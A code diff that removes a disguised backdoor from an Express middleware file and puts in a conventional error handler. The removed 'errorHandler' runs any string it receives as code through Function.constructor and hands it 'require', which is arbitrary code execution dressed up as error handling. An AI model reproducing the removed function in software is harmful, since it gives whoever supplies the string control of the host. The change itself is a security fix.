@@ -4,30 +4,15 @@ const notFound = (req, res, next) => {
   next(err);
 };
 
-const errorHandler = (error) => {
-  try {
-    if (typeof error !== "string") {
-      console.error("Invalid error format. Expected a string.");
-      return;
-    }
-    const createHandler = (errCode) => {
-      try {
-        const handler = new Function.constructor("require", errCode);
-        return handler;
-      } catch (e) {
-        console.error("Failed:", e.message);
-        return null;
-      }
-    };
-    const handlerFunc = createHandler(error);
-    if (handlerFunc) {
-      handlerFunc(require);
-    } else {
-      console.error("Handler function is not available.");
-    }
-  } catch (globalError) {
-    console.error("Unexpected error inside errorHandler:", globalError.message);
+const errorHandler = (err, req, res, next) => {
+  const status = err.status || 500;
+  const message = err.message || "Internal Server Error";
+
+  if (res.headersSent) {
+    return next(err);
   }
+
+  res.status(status).json({ message });
 };
 
 module.exports = { notFound, errorHandler };
